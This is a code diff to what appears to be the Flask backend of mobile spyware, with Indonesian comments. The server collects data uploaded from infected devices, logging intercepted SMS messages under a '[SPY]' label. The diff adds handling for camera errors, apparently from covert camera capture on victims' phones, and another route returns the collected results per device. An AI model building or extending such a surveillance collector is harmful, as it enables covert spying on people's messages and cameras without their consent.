@@ -70,6 +70,9 @@ def upload_result(device_id):
         elif data.get("type") == "sms":
             latest_results[device_id]["sms"] = data.get("data")
             print(f"[SPY] {len(data.get('data'))} SMS masuk dari {device_id}")
+        elif data.get("type") == "camera_error": # <--- TAMBAHKAN INI
+            latest_results[device_id]["camera_error"] = data.get("data")
+            print(f"[ERROR KAMERA] {data.get('data')}")
     return jsonify({"status": "success"})
 
 @app.route('/api/get_results/<device_id>', methods=['GET'])
